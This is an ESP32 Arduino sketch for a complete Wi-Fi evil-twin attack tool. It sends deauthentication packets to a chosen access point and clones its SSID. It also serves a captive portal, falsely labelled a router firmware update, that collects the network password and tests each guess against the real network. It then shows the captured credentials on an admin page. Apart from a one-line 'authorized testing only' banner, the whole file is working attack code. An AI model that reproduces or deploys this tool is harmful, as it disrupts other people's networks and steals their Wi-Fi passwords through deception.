#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

String targetSSID = "";
String targetBSSID = "";
int targetChannel = 1;
bool attacking = false;
bool portalOn = false;
String capturedPass = "";
String allAttempts = ""; // Sab attempts store karne k liye

// Deauth packet buffer
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

const char* mainPage = R"raw(<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{font-family:Arial;margin:0;padding:20px;background:#1a1a2e;color:#fff}
.container{max-width:600px;margin:auto}
h1{text-align:center;color:#eee}
.btn{padding:15px 30px;margin:10px;border:none;border-radius:5px;cursor:pointer;font-size:16px}
.scan{background:#00d4aa;color:#000}.attack{background:#ff4757;color:#fff}
.stop{background:#ffa502;color:#000}.admin{background:#3742fa;color:#fff}
.network{background:#16213e;padding:15px;margin:10px 0;border-radius:8px;cursor:pointer;border:2px solid transparent}
.network:hover{border-color:#00d4aa}.selected{border-color:#ff4757!important;background:#1f4068}
.ssid{font-weight:bold;font-size:18px}.info{color:#aaa;font-size:14px;margin-top:5px}
#status{text-align:center;padding:20px;background:#0f3460;border-radius:8px;margin:20px 0}
.warning{background:#ff4757;padding:15px;border-radius:8px;text-align:center;margin-bottom:20px}
</style></head>
<body><div class="container">
<h1>ESP32 WiFi Tool</h1>
<div class="warning">For authorized testing only!</div>
<div id="status">Ready</div>
<div style="text-align:center">
<button class="btn scan" onclick="scan()">Scan Networks</button>
<button class="btn attack" id="atk" onclick="startAtk()" style="display:none">Start Attack</button>
<button class="btn stop" id="stp" onclick="stopAtk()" style="display:none">Stop</button>
<button class="btn admin" onclick="location.href='/admin'">View Captured</button>
</div>
<div id="list"></div></div>
<script>
var selSSID='', selBSSID='', selCh=1;
function scan(){
    document.getElementById('status').innerHTML='Scanning...';
    fetch('/scan').then(r=>r.json()).then(d=>{
        let h='';
        d.n.forEach((n,i)=>{
            let enc=n.e?'🔒 WPA2':'🔓 Open';
            h+=`<div class="network" onclick="select('${n.s}','${n.b}',${n.c},${n.e},this)">
                <div class="ssid">📶 ${n.s}</div>
                <div class="info">Ch:${n.c} ${enc} ${n.r}dBm</div>
            </div>`;
        });
        document.getElementById('list').innerHTML=h;
        document.getElementById('status').innerHTML='Select target';
    });
}
function select(ssid,bssid,ch,enc,el){
    if(!enc){alert('Select secured network!');return;}
    document.querySelectorAll('.network').forEach(n=>n.classList.remove('selected'));
    el.classList.add('selected');
    selSSID=ssid;selBSSID=bssid;selCh=ch;
    document.getElementById('status').innerHTML='Target: <b>'+ssid+'</b>';
    document.getElementById('atk').style.display='inline-block';
}
function startAtk(){
    fetch('/set?s='+encodeURIComponent(selSSID)+'&b='+selBSSID+'&c='+selCh)
    .then(()=>fetch('/start')).then(()=>{
        document.getElementById('status').innerHTML='🚨 ATTACKING: '+selSSID;
        document.getElementById('atk').style.display='none';
        document.getElementById('stp').style.display='inline-block';
    });
}
function stopAtk(){
    fetch('/stop').then(()=>{
        document.getElementById('status').innerHTML='Stopped';
        document.getElementById('atk').style.display='inline-block';
        document.getElementById('stp').style.display='none';
    });
}
</script></body></html>)raw";

const char* captiveHTML = R"raw(<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px}
.box{max-width:350px;margin:50px auto;background:#fff;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
h2{color:#333;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}
button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:16px}
.error{color:red;text-align:center;display:none}.logo{text-align:center;font-size:48px;margin-bottom:20px}
</style></head>
<body><div class="box"><div class="logo">📶</div>
<h2>WiFi Security Update</h2>
<p style="color:#666;text-align:center">Enter password to update router firmware</p>
<input type="text" id="n" readonly><input type="password" id="p" placeholder="WiFi Password">
<p class="error" id="e">Wrong password!</p>
<button onclick="submit()">Connect & Update</button></div>
<script>
document.getElementById('n').value=location.hostname;
function submit(){
    fetch('/save?p='+encodeURIComponent(document.getElementById('p').value))
    .then(r=>r.text()).then(t=>{
        if(t=='OK')document.body.innerHTML='<div class="box"><h2 style="color:green">Success!</h2></div>';
        else{document.getElementById('e').style.display='block';document.getElementById('p').value='';}
    });
}</script></body></html>)raw";

void setup(){
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n============================");
    Serial.println("ESP32 WiFi Tool Starting...");
    Serial.println("============================\n");
    
    // Initialize WiFi
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
    WiFi.softAP("ESP32-Setup", "12345678");
    
    // DNS for captive portal
    dnsServer.start(53, "*", apIP);
    
    // Web routes
    server.on("/", [](){ server.send(200, "text/html", mainPage); });
    
    server.on("/scan", [](){
        String j = "{\"n\":[";
        int n = WiFi.scanNetworks();
        for(int i=0; i<n; i++){
            if(i) j += ",";
            j += "{\"s\":\"" + WiFi.SSID(i) + "\",\"b\":\"" + WiFi.BSSIDstr(i) + "\",";
            j += "\"c\":" + String(WiFi.channel(i)) + ",\"r\":" + WiFi.RSSI(i) + ",";
            j += "\"e\":" + String(WiFi.encryptionType(i) != WIFI_AUTH_OPEN ? "true" : "false") + "}";
        }
        j += "]}";
        server.send(200, "application/json", j);
    });
    
    server.on("/set", [](){
        targetSSID = server.arg("s");
        targetBSSID = server.arg("b");
        targetChannel = server.arg("c").toInt();
        Serial.println("Target: " + targetSSID);
        Serial.println("BSSID: " + targetBSSID);
        Serial.println("Channel: " + String(targetChannel));
        server.send(200, "text/plain", "OK");
    });
    
    server.on("/start", [](){
        if(targetSSID.length() == 0){
            server.send(400, "text/plain", "No target");
            return;
        }
        attacking = true;
        portalOn = true;
        
        // Stop current AP and start evil twin
        WiFi.softAPdisconnect(true);
        delay(200);
        
        // Set channel before starting AP
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        delay(100);
        
        WiFi.softAP(targetSSID.c_str());
        
        Serial.println("\n======== ATTACK STARTED ========");
        Serial.println("Deauthing: " + targetSSID);
        Serial.println("Fake AP: " + targetSSID);
        Serial.println("Channel: " + String(targetChannel));
        Serial.println("================================\n");
        
        server.send(200, "text/plain", "OK");
    });
    
    server.on("/stop", [](){
        attacking = false;
        portalOn = false;
        WiFi.softAPdisconnect(true);
        delay(200);
        WiFi.softAP("ESP32-Setup", "12345678");
        Serial.println("Attack stopped");
        server.send(200, "text/plain", "OK");
    });
    
    server.on("/save", [](){
        String pass = server.arg("p");
        Serial.println("\n----- PASSWORD ATTEMPT -----");
        Serial.println("Network: " + targetSSID);
        Serial.println("Password: " + pass);
        
        // Store attempt
        allAttempts += "Network: " + targetSSID + " | Pass: " + pass + "<br>";
        
        // Try to verify
        WiFi.begin(targetSSID.c_str(), pass.c_str());
        
        int tries = 0;
        while(WiFi.status() != WL_CONNECTED && tries < 15){
            delay(500);
            tries++;
        }
        
        if(WiFi.status() == WL_CONNECTED){
            Serial.println("✓ CORRECT PASSWORD!");
            capturedPass = pass;
            attacking = false;
            portalOn = false;
            
            // Stop evil twin and restart config AP
            WiFi.softAPdisconnect(true);
            delay(200);
            WiFi.softAP("ESP32-Setup", "12345678");
            WiFi.disconnect();
            
            server.send(200, "text/plain", "OK");
        } else {
            Serial.println("✗ Wrong password");
            server.send(200, "text/plain", "NO");
        }
    });
    
    server.on("/admin", [](){
        String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
        html += "<style>body{font-family:Arial;padding:20px;background:#1a1a2e;color:#fff}";
        html += ".box{background:#16213e;padding:20px;border-radius:10px;margin:10px 0}";
        html += "h1{color:#00d4aa}h2{color:#ff6b6b}.pass{color:#0f0;font-size:20px;font-weight:bold}</style></head><body>";
        html += "<h1>Captured Passwords</h1>";
        
        if(capturedPass.length() > 0){
            html += "<div class='box'><h2>✓ CORRECT PASSWORD:</h2>";
            html += "<p class='pass'>Network: " + targetSSID + "</p>";
            html += "<p class='pass'>Password: " + capturedPass + "</p></div>";
        } else {
            html += "<div class='box'><p>No correct password yet...</p></div>";
        }
        
        if(allAttempts.length() > 0){
            html += "<div class='box'><h3>All Attempts:</h3><p>" + allAttempts + "</p></div>";
        }
        
        html += "<br><a href='/' style='color:#00d4aa'>Back to Main</a>";
        html += "</body></html>";
        
        server.send(200, "text/html", html);
    });
    
    server.onNotFound([](){
        server.send(200, "text/html", captiveHTML);
    });
    
    server.begin();
    
    Serial.println("Config AP: ESP32-Setup");
    Serial.println("IP: 192.168.4.1");
    Serial.println("Open 192.168.4.1 in browser\n");
}

void loop(){
    dnsServer.processNextRequest();
    server.handleClient();
    
    if(attacking && targetBSSID.length() > 0){
        sendDeauth();
        delay(50); // 20 packets per second
    }
}

void sendDeauth(){
    // Parse BSSID
    uint8_t mac[6];
    int values[6];
    if(6 == sscanf(targetBSSID.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])){
        for(int i=0; i<6; i++) mac[i] = (uint8_t)values[i];
    } else {
        return;
    }
    
    // Set channel
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build deauth packet
    // Destination: Broadcast (FF:FF:FF:FF:FF:FF)
    for(int i=0; i<6; i++) deauthPacket[4+i] = 0xFF;
    
    // Source: Target AP
    for(int i=0; i<6; i++) deauthPacket[10+i] = mac[i];
    
    // BSSID: Target AP
    for(int i=0; i<6; i++) deauthPacket[16+i] = mac[i];
    
    // Send deauth from AP to broadcast (reason 7)
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
    
    if(result == ESP_OK){
        Serial.print(".");
    } else {
        Serial.print("X");
    }
    
    // Also send in reverse direction
    for(int i=0; i<6; i++){
        deauthPacket[4+i] = mac[i];   // Destination: AP
        deauthPacket[10+i] = 0xFF;    // Source: broadcast (spoofed)
    }
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
}